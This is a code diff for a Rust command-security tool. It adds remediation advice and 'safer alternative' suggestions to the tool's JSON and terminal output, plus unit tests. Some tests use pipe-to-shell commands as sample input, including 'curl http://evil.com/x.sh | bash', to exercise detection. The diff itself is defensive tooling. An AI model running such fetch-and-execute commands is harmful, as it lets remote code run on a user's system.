@@ -1,15 +1,42 @@
 use std::io::Write;
 
+use crate::safe_command::SafeSuggestion;
 use crate::verdict::{Action, Evidence, Finding, Verdict};
 
 const SCHEMA_VERSION: u32 = 3;
+
+/// A [`Finding`] serialized with its per-rule `remediation` appended.
+///
+/// `remediation` is the canonical "what to do instead" advice keyed by
+/// `rule_id` (see [`crate::rule_explanations::remediation`]). It is static,
+/// secret-free text, so it needs no redaction. Serializing through this view
+/// keeps the on-disk [`Finding`] struct (and every other consumer of it —
+/// SARIF, audit, last-trigger) unchanged: remediation appears only in the
+/// `check`/`paste` JSON surface, exactly where it is asked for.
+#[derive(serde::Serialize)]
+pub struct FindingView<'a> {
+    #[serde(flatten)]
+    pub finding: &'a Finding,
+    /// Per-rule remediation. Empty string omitted.
+    #[serde(skip_serializing_if = "str::is_empty")]
+    pub remediation: &'a str,
+}
+
+impl<'a> FindingView<'a> {
+    fn of(finding: &'a Finding) -> Self {
+        FindingView {
+            finding,
+            remediation: crate::rule_explanations::remediation(finding.rule_id),
+        }
+    }
+}
 
 /// JSON output wrapper with schema version.
 #[derive(serde::Serialize)]
 pub struct JsonOutput<'a> {
     pub schema_version: u32,
     pub action: Action,
-    pub findings: &'a [Finding],
+    pub findings: Vec<FindingView<'a>>,
     pub tier_reached: u8,
     pub bypass_requested: bool,
     pub bypass_honored: bool,
@@ -18,19 +45,37 @@ pub struct JsonOutput<'a> {
     pub timings_ms: &'a crate::verdict::Timings,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub urls_extracted_count: Option<usize>,
+    /// Concrete safer-command suggestions — only present when the caller
+    /// passed `--suggest-safe-command` and the verdict is non-Allow.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub safe_suggestions: Option<&'a [SafeSuggestion]>,
 }
 
 /// Write verdict as JSON to the given writer.
 pub fn write_json(
     verdict: &Verdict,
     custom_patterns: &[String],
+    w: impl Write,
+) -> std::io::Result<()> {
+    write_json_with_suggestions(verdict, custom_patterns, None, w)
+}
+
+/// Write verdict as JSON, optionally embedding safe-command suggestions.
+///
+/// `suggestions` is `Some` only when the caller requested
+/// `--suggest-safe-command`; passing `None` is identical to [`write_json`].
+pub fn write_json_with_suggestions(
+    verdict: &Verdict,
+    custom_patterns: &[String],
+    suggestions: Option<&[SafeSuggestion]>,
     mut w: impl Write,
 ) -> std::io::Result<()> {
     let redacted_findings = crate::redact::redacted_findings(&verdict.findings, custom_patterns);
+    let findings: Vec<FindingView> = redacted_findings.iter().map(FindingView::of).collect();
     let output = JsonOutput {
         schema_version: SCHEMA_VERSION,
         action: verdict.action,
-        findings: &redacted_findings,
+        findings,
         tier_reached: verdict.tier_reached,
         bypass_requested: verdict.bypass_requested,
         bypass_honored: verdict.bypass_honored,
@@ -38,6 +83,7 @@ pub fn write_json(
         policy_path_used: &verdict.policy_path_used,
         timings_ms: &verdict.timings_ms,
         urls_extracted_count: verdict.urls_extracted_count,
+        safe_suggestions: suggestions,
     };
     serde_json::to_writer(&mut w, &output)?;
     writeln!(w)?;
@@ -113,6 +159,13 @@ pub fn write_human(verdict: &Verdict, warn_only: bool, mut w: impl Write) -> std
                 }
             }
         }
+
+        // Per-rule remediation — concise "what to do instead" line.
+        let fix = crate::rule_explanations::remediation(finding.rule_id);
+        if !fix.is_empty() {
+            let label = crate::style::bold("Fix:", crate::style::Stream::Stderr);
+            writeln!(w, "    {label} {fix}")?;
+        }
     }
 
     if verdict.action == Action::Block && verdict.bypass_available {
@@ -176,6 +229,45 @@ pub fn write_human_auto(verdict: &Verdict, warn_only: bool) -> std::io::Result<(
     }
 }
 
+/// Write the `--suggest-safe-command` block to the given writer.
+///
+/// For each suggestion, prints a concrete safer command when one exists, or an
+/// honest "no automatic rewrite" line otherwise — always followed by the
+/// per-rule remediation. Does nothing when `suggestions` is empty. Advisory
+/// output only; never affects exit codes.
+pub fn write_safe_suggestions(
+    suggestions: &[SafeSuggestion],
+    mut w: impl Write,
+) -> std::io::Result<()> {
+    if suggestions.is_empty() {
+        return Ok(());
+    }
+    let stream = crate::style::Stream::Stderr;
+    writeln!(
+        w,
+        "{}",
+        crate::style::bold("tirith: safer alternative", stream)
+    )?;
+    for s in suggestions {
+        writeln!(w, "  {}", s.rule_id)?;
+        if let Some(cmd) = &s.safe_command {
+            writeln!(w, "    {} {cmd}", crate::style::bold("try:", stream))?;
+        }
+        // `rationale` is self-contained: for a rewrite it explains why the
+        // rewrite is safer; with no rewrite it states no safe rewrite exists.
+        writeln!(w, "    why: {}", s.rationale)?;
+        if !s.remediation.is_empty() {
+            writeln!(
+                w,
+                "    {} {}",
+                crate::style::bold("fix:", stream),
+                s.remediation
+            )?;
+        }
+    }
+    Ok(())
+}
+
 /// Write human-readable output without ANSI colors.
 fn write_human_no_color(
     verdict: &Verdict,
@@ -237,6 +329,12 @@ fn write_human_no_color(
                     }
                 }
             }
+        }
+
+        // Per-rule remediation — concise "what to do instead" line.
+        let fix = crate::rule_explanations::remediation(finding.rule_id);
+        if !fix.is_empty() {
+            writeln!(w, "    Fix: {fix}")?;
         }
     }
 
@@ -381,5 +479,104 @@ mod tests {
             !json.contains("DETECTED"),
             "JSON must not carry the DETECTED banner string: {json}"
         );
+    }
+
+    #[test]
+    fn write_json_findings_carry_remediation() {
+        // Each finding in JSON must gain a `remediation` field flattened in
+        // alongside rule_id/severity/title.
+        let verdict = block_verdict_with_bypass();
+        let mut buf = Vec::new();
+        write_json(&verdict, &[], &mut buf).unwrap();
+        let v: serde_json::Value = serde_json::from_slice(&buf).unwrap();
+        let finding = &v["findings"][0];
+        assert_eq!(finding["rule_id"], "plain_http_to_sink");
+        // remediation present and equal to the canonical per-rule advice.
+        assert_eq!(
+            finding["remediation"].as_str().unwrap(),
+            crate::rule_explanations::remediation(RuleId::PlainHttpToSink)
+        );
+    }
+
+    #[test]
+    fn write_json_omits_safe_suggestions_when_none() {
+        // Default `write_json` must not emit a `safe_suggestions` key at all.
+        let verdict = block_verdict_with_bypass();
+        let mut buf = Vec::new();
+        write_json(&verdict, &[], &mut buf).unwrap();
+        let v: serde_json::Value = serde_json::from_slice(&buf).unwrap();
+        assert!(v.get("safe_suggestions").is_none());
+    }
+
+    #[test]
+    fn write_json_with_suggestions_embeds_them() {
+        let verdict = block_verdict_with_bypass();
+        let sugg = crate::safe_command::suggest(
+            "curl http://evil.com/x.sh | bash",
+            crate::tokenize::ShellType::Posix,
+            &verdict,
+        );
+        let mut buf = Vec::new();
+        write_json_with_suggestions(&verdict, &[], Some(&sugg), &mut buf).unwrap();
+        let v: serde_json::Value = serde_json::from_slice(&buf).unwrap();
+        let arr = v["safe_suggestions"].as_array().unwrap();
+        assert_eq!(arr.len(), 1);
+        assert_eq!(arr[0]["rule_id"], "plain_http_to_sink");
+    }
+
+    #[test]
+    fn human_output_includes_fix_line() {
+        let verdict = block_verdict_with_bypass();
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            out.contains("Fix:"),
+            "human output must show a Fix line: {out}"
+        );
+        assert!(
+            out.contains(crate::rule_explanations::remediation(
+                RuleId::PlainHttpToSink
+            )),
+            "Fix line must carry the rule's remediation: {out}"
+        );
+    }
+
+    #[test]
+    fn write_safe_suggestions_empty_is_silent() {
+        let mut buf = Vec::new();
+        write_safe_suggestions(&[], &mut buf).unwrap();
+        assert!(buf.is_empty(), "no suggestions → no output");
+    }
+
+    #[test]
+    fn write_safe_suggestions_renders_try_and_fix() {
+        let verdict = Verdict::from_findings(
+            vec![Finding {
+                rule_id: RuleId::CurlPipeShell,
+                severity: Severity::High,
+                title: "t".into(),
+                description: "d".into(),
+                evidence: vec![Evidence::Text { detail: "e".into() }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            }],
+            3,
+            Timings::default(),
+        );
+        let sugg = crate::safe_command::suggest(
+            "curl https://example.com/x.sh | bash",
+            crate::tokenize::ShellType::Posix,
+            &verdict,
+        );
+        let mut buf = Vec::new();
+        write_safe_suggestions(&sugg, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(out.contains("safer alternative"), "{out}");
+        assert!(out.contains("try:"), "{out}");
+        assert!(out.contains("/tmp/tirith-review.sh"), "{out}");
+        assert!(out.contains("fix:"), "{out}");
     }
 }
